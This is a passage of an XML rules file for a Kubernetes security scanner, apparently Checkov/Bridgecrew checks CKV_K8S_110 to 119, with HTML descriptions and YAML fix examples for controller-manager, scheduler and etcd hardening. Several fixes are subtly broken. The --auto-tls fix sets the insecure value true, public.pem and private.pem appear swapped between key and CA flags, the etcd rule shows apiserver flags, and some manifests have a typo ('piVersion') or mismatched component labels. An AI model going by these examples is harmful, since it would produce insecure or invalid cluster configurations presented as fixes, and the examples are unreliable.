<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-controller-manager
      tier: control-plane
    name: kube-controller-manager
    namespace: kube-system
  spec:
    containers:
    - command:
      - kube-controller-manager
+     -  --use-service-account-credentials=true
      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-use-service-account-credentials-argument-is-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-use-service-account-credentials-argument-is-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-use-service-account-credentials-argument-is-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_110</key>
    <name>Ensure the --service-account-private-key-file argument for controller managers is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---service-account-private-key-file-argument-for-controller-managers-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-service-account-private-key-file-argument-for-controller-managers-is-not-set-appropriately"></div>The --service-account-private-key-file argument for controller managers is not set appropriately</div><a aria-label="Skip link to The --service-account-private-key-file argument for controller managers is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---service-account-private-key-file-argument-for-controller-managers-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Explicitly set a service account private key file for service accounts on the controller manager. To ensure that keys for service account tokens can be rotated as needed, a separate public/private key pair should be used for signing service account tokens. The private key should be specified to the controller manager with --service-account-private-key-file as appropriate.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-controller-manager
      tier: control-plane
    name: kube-controller-manager
    namespace: kube-system
  spec:
    containers:
    - command:
      - kube-controller-manager
+     -  --service-account-private-key-file=public.pem
      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-service-account-private-key-file-argument-is-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-service-account-private-key-file-argument-is-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-service-account-private-key-file-argument-is-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_111</key>
    <name>Ensure the --root-ca-file argument for controller managers is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---root-ca-file-argument-for-controller-managers-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-root-ca-file-argument-for-controller-managers-is-not-set-appropriately"></div>The --root-ca-file argument for controller managers is not set appropriately</div><a aria-label="Skip link to The --root-ca-file argument for controller managers is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---root-ca-file-argument-for-controller-managers-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Allow pods to verify the API server's serving certificate before establishing connections.<br/>
Processes running within pods that need to contact the API server must verify the API server's serving certificate. Failing to do so could be a subject to man-in-the-middle attacks.<br/>
Providing the root certificate for the API server's serving certificate to the controller manager with the --root-ca-file argument allows the controller manager to inject the trusted bundle into pods so that they can verify TLS connections to the API server.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-controller-manager
      tier: control-plane
    name: kube-controller-manager
    namespace: kube-system
  spec:
    containers:
    - command:
      - kube-controller-manager
+     -  --root-ca-file=private.pem
      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-root-ca-file-argument-is-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-root-ca-file-argument-is-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-root-ca-file-argument-is-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_112</key>
    <name>Ensure the RotateKubeletServerCertificate argument for controller managers is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-rotatekubeletservercertificate-argument-for-controller-managers-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-rotate-kubelet-server-certificate-argument-for-controller-managers-is-not-set-to-true"></div>The RotateKubeletServerCertificate argument for controller managers is not set to True </div><a aria-label="Skip link to The RotateKubeletServerCertificate argument for controller managers is not set to True " class="heading-anchor-icon fa fa-anchor" href="#the-rotatekubeletservercertificate-argument-for-controller-managers-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable kubelet server certificate rotation. RotateKubeletServerCertificate causes the kubelet to both request a serving certificate after bootstrapping its client credentials and rotate the certificate as its existing credentials expire. This automated periodic rotation ensures that the there are no downtimes due to expired certificates and thus addressing availability in the CIA security triad.</p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This recommendation only applies if you let kubelets get their certificates from the API server. In case your kubelet certificates come from an outside authority/tool (e.g. Vault) then you need to take care of rotation yourself.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Kind:</strong> Pod</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --feature-gates=RotateKubeletServerCertificate=true
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-rotatekubeletservercertificate-argument-is-set-to-true-for-controller-manager' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-rotatekubeletservercertificate-argument-is-set-to-true-for-controller-manager</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-rotatekubeletservercertificate-argument-is-set-to-true-for-controller-manager' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_113</key>
    <name>Ensure the --bind-address argument for controller managers is set to 127.0.0.1</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---bind-address-argument-for-controller-managers-is-not-set-to-127001"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-bind-address-argument-for-controller-managers-is-not-set-to-127-0-0-1"></div>The --bind-address argument for controller managers is not set to 127.0.0.1</div><a aria-label="Skip link to The --bind-address argument for controller managers is not set to 127.0.0.1" class="heading-anchor-icon fa fa-anchor" href="#the---bind-address-argument-for-controller-managers-is-not-set-to-127001"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not bind the Controller Manager service to non-loopback insecure addresses. The Controller Manager API service which runs on port 10252/TCP by default is used for health and metrics information and is available without authentication or encryption. As such it should only be bound to a localhost interface, to minimize the cluster's attack surface</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-apiserver
      tier: control-plane
    name: kube-apiserver
    namespace: kube-system
  spec:
    containers:
    - command:
      - kube-controller-manager
+     - --bind-address=127.0.0.1
      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_114</key>
    <name>Ensure the --profiling argument is set to False</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---profiling-argument-is-not-set-to-false"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-profiling-argument-is-not-set-to-false"></div>The --profiling argument is not set to False</div><a aria-label="Skip link to The --profiling argument is not set to False" class="heading-anchor-icon fa fa-anchor" href="#the---profiling-argument-is-not-set-to-false"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable profiling, if not needed.<br/>
Profiling allows for the identification of specific performance bottlenecks. It generates a significant amount of program data that could potentially be exploited to uncover system and program details. If you are not experiencing any bottlenecks and do not need the profiler for troubleshooting purposes, it is recommended to turn it off to reduce the potential attack surface.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-scheduler
    tier: control-plane
  name: kube-scheduler
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-scheduler
+   - --profiling=false
    image: gcr.io/google_containers/kube-scheduler-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_115</key>
    <name>Ensure the --bind-address argument is set to 127.0.0.1</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---bind-address-argument-is-not-set-to-127001"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-bind-address-argument-is-not-set-to-127-0-0-1"></div>The --bind-address argument is not set to 127.0.0.1</div><a aria-label="Skip link to The --bind-address argument is not set to 127.0.0.1" class="heading-anchor-icon fa fa-anchor" href="#the---bind-address-argument-is-not-set-to-127001"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not bind the scheduler service to non-loopback insecure addresses. The Scheduler API service which runs on port 10251/TCP by default is used for health and metrics information and is available without authentication or encryption. As such it should only be bound to a localhost interface, to minimize the cluster's attack surface.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">piVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+    - kube-scheduler
+    - --bind-address=127.0.0.1
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_116</key>
    <name>Ensure the --cert-file and --key-file arguments are set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---cert-file-and---key-file-arguments-are-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-cert-file-and-key-file-arguments-are-not-set-appropriately"></div>The --cert-file and --key-file arguments are not set appropriately</div><a aria-label="Skip link to The --cert-file and --key-file arguments are not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---cert-file-and---key-file-arguments-are-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Configure TLS encryption for the etcd service. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be encrypted in transit.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --etcd-certfile=/path/to/cert
+   - --etcd-keyfile=/path/to/key
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-cert-file-and-key-file-arguments-are-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-cert-file-and-key-file-arguments-are-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-cert-file-and-key-file-arguments-are-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_117</key>
    <name>Ensure the --client-cert-auth argument is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---client-cert-auth-argument-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-client-cert-auth-argument-is-not-set-to-true"></div>The --client-cert-auth argument is not set to True</div><a aria-label="Skip link to The --client-cert-auth argument is not set to True" class="heading-anchor-icon fa fa-anchor" href="#the---client-cert-auth-argument-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable client authentication on etcd service. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should not be available to unauthenticated clients. You should enable the client authentication via valid certificates to secure the access to the etcd service.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  annotations:
    scheduler.alpha.kubernetes.io/critical-pod: ""
  creationTimestamp: null
  labels:
    component: etcd
    tier: control-plane
  name: etcd
  namespace: kube-system
spec:
  containers:
  - command:
+   - etcd
+   - --client-cert-auth=true
    image: k8s.gcr.io/etcd-amd64:3.2.18
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-client-cert-auth-argument-is-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-client-cert-auth-argument-is-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-client-cert-auth-argument-is-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_118</key>
    <name>Ensure the --auto-tls argument is not set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---auto-tls-argument-is-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-auto-tls-argument-is-set-to-true"></div>The --auto-tls argument is set to True</div><a aria-label="Skip link to The --auto-tls argument is set to True" class="heading-anchor-icon fa fa-anchor" href="#the---auto-tls-argument-is-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not use self-signed certificates for TLS. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should not be available to unauthenticated clients. You should enable the client authentication via valid certificates to secure the access to the etcd service.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  annotations:
    scheduler.alpha.kubernetes.io/critical-pod: ""
  creationTimestamp: null
  labels:
    component: etcd
    tier: control-plane
  name: etcd
  namespace: kube-system
spec:
  containers:
  - command:
+   - etcd
+   - --auto-tls=true
    image: k8s.gcr.io/etcd-amd64:3.2.18
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-auto-tls-argument-is-not-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-auto-tls-argument-is-not-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-auto-tls-argument-is-not-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_119</key>
    <name>Ensure the --peer-cert-file and --peer-key-file arguments are set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---peer-cert-file-and---peer-key-file-arguments-are-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-peer-cert-file-and-peer-key-file-arguments-are-not-set-appropriately"></div>The --peer-cert-file and --peer-key-file arguments are not set appropriately</div><a aria-label="Skip link to The --peer-cert-file and --peer-key-file arguments are not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---peer-cert-file-and---peer-key-file-arguments-are-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>etcd should be configured to make use of TLS encryption for peer connections. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be encrypted in transit and also amongst peers in the etcd clusters.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
